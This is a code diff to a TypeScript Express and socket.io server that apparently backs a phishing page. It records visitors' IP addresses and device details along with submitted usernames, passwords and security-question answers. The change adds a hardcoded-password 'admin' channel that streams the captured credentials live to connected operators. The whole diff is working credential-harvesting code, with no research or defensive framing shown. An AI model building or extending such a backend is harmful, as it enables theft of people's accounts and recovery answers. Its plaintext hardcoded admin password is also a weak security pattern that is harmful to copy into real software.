@@ -4,7 +4,7 @@
 
 import express from "express";
 import http from "http";
-import { Server } from "socket.io";
+import { Server, Socket } from "socket.io";
 
 import UAParser from "ua-parser-js";
 
@@ -14,6 +14,9 @@ const server = http.createServer(app);
 const io = new Server(server, {
     path: "/report/"
 });
+
+// secure ikr?
+const adminPw = "hackerman";
 
 // Just doing this to test that the is running.
 app.get("/", (req, res) => res.send("What a great day to get hacked!"));
@@ -27,6 +30,8 @@ const addrCache = new Set();
 // and they just make a bunch of random crap in the console.
 const sidMap = new Map();
 
+const authorizedCns: Set<Socket> = new Set();
+
 io.on("connection", (socket) => {
     const ipAddr = socket.handshake.headers["x-forwarded-for"] ?? socket.handshake.address;
     const hasConnected = addrCache.has(ipAddr);
@@ -39,26 +44,47 @@ io.on("connection", (socket) => {
 
     if (!hasConnected) {
         addrCache.add(ipAddr);
-        console.log(`[${pseudoSid}] IP address: ${ipAddr}`);
+        sendLog(`[${pseudoSid}] IP address: ${ipAddr}`);
 
         const ua = new UAParser(socket.handshake.headers["user-agent"]);
-        console.log(`[${pseudoSid}] Browser: ${ua.getBrowser().name ?? "unknown"} ${ua.getBrowser().version ?? "(unknown version)"}`);
-        console.log(`[${pseudoSid}] OS: ${ua.getOS().name} ${ua.getOS().version ?? "unknown"}`);
-        console.log(`[${pseudoSid}] Device: ${ua.getDevice().vendor ?? "(unknown vendor)"} ${ua.getDevice().model ?? "(unknown model)"}`);
+        sendLog(`[${pseudoSid}] Browser: ${ua.getBrowser().name ?? "unknown"} ${ua.getBrowser().version ?? "(unknown version)"}`);
+        sendLog(`[${pseudoSid}] OS: ${ua.getOS().name} ${ua.getOS().version ?? "unknown"}`);
+        sendLog(`[${pseudoSid}] Device: ${ua.getDevice().vendor ?? "(unknown vendor)"} ${ua.getDevice().model ?? "(unknown model)"}`);
+    }
+
+    socket.on("admin", (data) => {
+        // I'm not going to bother with a proper authentication system
+        if (data.password !== adminPw) {
+            console.log(`[${pseudoSid}] Connection unauthorized.`);
+            socket.emit("adminauth", { success: false });
+            return;
+        }
+
+        sendLog(`[${pseudoSid}] Connection authorized.`);
+        socket.emit("adminauth", { success: true });
+
+        // disconnect 
+        authorizedCns.add(socket);
+        socket.on("disconnect", () => authorizedCns.delete(socket));
+    });
+
+    function sendLog(data: string) {
+        for (const cn of authorizedCns)
+            cn.emit("log", data);
     }
 
     socket.on("credentials", (data) => {
-        console.log(`[${pseudoSid}] Username: ${data.username}`);
-        console.log(`[${pseudoSid}] Password: ${data.password}`);
+        sendLog(`[${pseudoSid}] Username: ${data.username}`);
+        sendLog(`[${pseudoSid}] Password: ${data.password}`);
     });
 
     socket.on("sq", (data) => {
-        console.log(`[${pseudoSid}] Security Question: "${data.question}", answered "${data.answer}"`);
+        sendLog(`[${pseudoSid}] Security Question: "${data.question}", answered "${data.answer}"`);
     });
 
     socket.on("disconnect", () => {
         if (!hasConnected)
-            console.log(`[${pseudoSid}] Disconnected.`);
+            sendLog(`[${pseudoSid}] Disconnected.`);
         sidMap.delete(socket.id);
     });
 });
